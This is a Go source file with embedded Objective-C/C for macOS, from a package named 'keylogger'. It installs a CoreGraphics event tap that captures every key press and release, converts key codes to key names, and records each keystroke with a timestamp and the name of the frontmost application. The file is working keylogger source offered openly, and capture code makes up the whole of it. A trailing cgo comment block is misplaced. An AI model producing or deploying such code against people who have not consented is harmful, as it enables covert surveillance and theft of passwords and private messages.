//go:build darwin

package keylogger

import (
	"fmt"
	"time"
)

/*
#cgo CFLAGS: -x objective-c
#cgo LDFLAGS: -framework Cocoa -framework Carbon -framework CoreGraphics -framework ApplicationServices

#include <Carbon/Carbon.h>
#include <CoreGraphics/CoreGraphics.h>
#include <ApplicationServices/ApplicationServices.h>

// Forward declaration
CGEventRef eventCallback(CGEventTapProxy proxy, CGEventType type, CGEventRef event, void *refcon);

// Global variable to hold the event tap
CFMachPortRef eventTap = NULL;

// Start the event tap
int startEventTap() {
    CGEventMask eventMask = (1 << kCGEventKeyDown) | (1 << kCGEventKeyUp);
    
    eventTap = CGEventTapCreate(
        kCGSessionEventTap,
        kCGHeadInsertEventTap,
        kCGEventTapOptionDefault,
        eventMask,
        eventCallback,
        NULL
    );
    
    if (!eventTap) {
        return 0; // Failed
    }
    
    CFRunLoopSourceRef runLoopSource = CFMachPortCreateRunLoopSource(kCFAllocatorDefault, eventTap, 0);
    CFRunLoopAddSource(CFRunLoopGetCurrent(), runLoopSource, kCFRunLoopCommonModes);
    CGEventTapEnable(eventTap, true);
    
    CFRelease(runLoopSource);
    return 1; // Success
}

// Stop the event tap
void stopEventTap() {
    if (eventTap) {
        CGEventTapEnable(eventTap, false);
        CFRelease(eventTap);
        eventTap = NULL;
    }
}

// Get the title of the frontmost application
char* getFrontmostAppName() {
    ProcessSerialNumber psn;
    OSStatus err = GetFrontProcess(&psn);
    if (err != noErr) {
        return NULL;
    }
    
    CFStringRef appName;
    err = CopyProcessName(&psn, &appName);
    if (err != noErr) {
        return NULL;
    }
    
    const char* cStr = CFStringGetCStringPtr(appName, kCFStringEncodingUTF8);
    if (cStr == NULL) {
        CFIndex length = CFStringGetLength(appName);
        CFIndex maxSize = CFStringGetMaximumSizeForEncoding(length, kCFStringEncodingUTF8) + 1;
        char* buffer = malloc(maxSize);
        if (CFStringGetCString(appName, buffer, maxSize, kCFStringEncodingUTF8)) {
            CFRelease(appName);
            return buffer;
        }
        free(buffer);
    } else {
        char* buffer = malloc(strlen(cStr) + 1);
        strcpy(buffer, cStr);
        CFRelease(appName);
        return buffer;
    }
    
    CFRelease(appName);
    return NULL;
}
*/
import "C"

import (
	"runtime"
	"unsafe"
)

// macOS keylogger using CoreGraphics event taps
func (k *Keylogger) startHook() {
	// Lock OS thread since we're dealing with Cocoa/Carbon APIs
	runtime.LockOSThread()
	defer runtime.UnlockOSThread()

	// Start the event tap
	result := C.startEventTap()
	if result == 0 {
		return // Failed to create event tap
	}

	// Run the event loop while keylogger is active
	for k.isRunning {
		time.Sleep(100 * time.Millisecond)
	}
}

func (k *Keylogger) stopHook() {
	C.stopEventTap()
}

// Get active window title on macOS
func getActiveWindow() string {
	cAppName := C.getFrontmostAppName()
	if cAppName == nil {
		return "Unknown"
	}
	defer C.free(unsafe.Pointer(cAppName))
	
	return C.GoString(cAppName)
}

//export handleKeyEvent
func handleKeyEvent(eventType C.CGEventType, keyCode C.CGKeyCode) {
	if globalKeylogger == nil || !globalKeylogger.isRunning {
		return
	}

	var eventTypeStr string
	switch eventType {
	case C.kCGEventKeyDown:
		eventTypeStr = "keydown"
	case C.kCGEventKeyUp:
		eventTypeStr = "keyup"
	default:
		return
	}

	key := macOSKeyCodeToString(uint16(keyCode))
	window := getActiveWindow()

	event := KeyEvent{
		Key:       key,
		Timestamp: time.Now(),
		Window:    window,
		Type:      eventTypeStr,
	}

	globalKeylogger.AddEvent(event)
}

// Convert macOS key codes to string
func macOSKeyCodeToString(keyCode uint16) string {
	// macOS key code mapping
	keyMap := map[uint16]string{
		0:   "A",
		1:   "S",
		2:   "D",
		3:   "F",
		4:   "H",
		5:   "G",
		6:   "Z",
		7:   "X",
		8:   "C",
		9:   "V",
		11:  "B",
		12:  "Q",
		13:  "W",
		14:  "E",
		15:  "R",
		16:  "Y",
		17:  "T",
		18:  "1",
		19:  "2",
		20:  "3",
		21:  "4",
		22:  "6",
		23:  "5",
		24:  "=",
		25:  "9",
		26:  "7",
		27:  "-",
		28:  "8",
		29:  "0",
		30:  "]",
		31:  "O",
		32:  "U",
		33:  "[",
		34:  "I",
		35:  "P",
		36:  "Enter",
		37:  "L",
		38:  "J",
		39:  "'",
		40:  "K",
		41:  ";",
		42:  "\\",
		43:  ",",
		44:  "/",
		45:  "N",
		46:  "M",
		47:  ".",
		48:  "Tab",
		49:  "Space",
		50:  "`",
		51:  "Backspace",
		53:  "Escape",
		54:  "RightCmd",
		55:  "LeftCmd",
		56:  "LeftShift",
		57:  "CapsLock",
		58:  "LeftAlt",
		59:  "LeftCtrl",
		60:  "RightShift",
		61:  "RightAlt",
		62:  "RightCtrl",
		63:  "Function",
		64:  "F17",
		65:  "NumpadDecimal",
		67:  "NumpadMultiply",
		69:  "NumpadAdd",
		71:  "NumLock",
		75:  "NumpadDivide",
		76:  "NumpadEnter",
		78:  "NumpadSubtract",
		79:  "F18",
		80:  "F19",
		81:  "NumpadEquals",
		82:  "Numpad0",
		83:  "Numpad1",
		84:  "Numpad2",
		85:  "Numpad3",
		86:  "Numpad4",
		87:  "Numpad5",
		88:  "Numpad6",
		89:  "Numpad7",
		90:  "F20",
		91:  "Numpad8",
		92:  "Numpad9",
		96:  "F5",
		97:  "F6",
		98:  "F7",
		99:  "F3",
		100: "F8",
		101: "F9",
		103: "F11",
		105: "F13",
		106: "F16",
		107: "F14",
		109: "F10",
		111: "F12",
		113: "F15",
		114: "Help",
		115: "Home",
		116: "PageUp",
		117: "Delete",
		118: "F4",
		119: "End",
		120: "F2",
		121: "PageDown",
		122: "F1",
		123: "Left",
		124: "Right",
		125: "Down",
		126: "Up",
	}

	if key, exists := keyMap[keyCode]; exists {
		return key
	}

	return fmt.Sprintf("KEY_%d", keyCode)
}

/*
#include <Carbon/Carbon.h>
#include <CoreGraphics/CoreGraphics.h>
#include <ApplicationServices/ApplicationServices.h>

// Forward declarations
void handleKeyEvent(CGEventType eventType, CGKeyCode keyCode);

// C callback function for handling key events
CGEventRef eventCallback(CGEventTapProxy proxy, CGEventType type, CGEventRef event, void *refcon) {
    if (type == kCGEventKeyDown || type == kCGEventKeyUp) {
        CGKeyCode keyCode = (CGKeyCode)CGEventGetIntegerValueField(event, kCGKeyboardEventKeycode);
        handleKeyEvent(type, keyCode);
    }
    
    return event; // Pass through the event
}
*/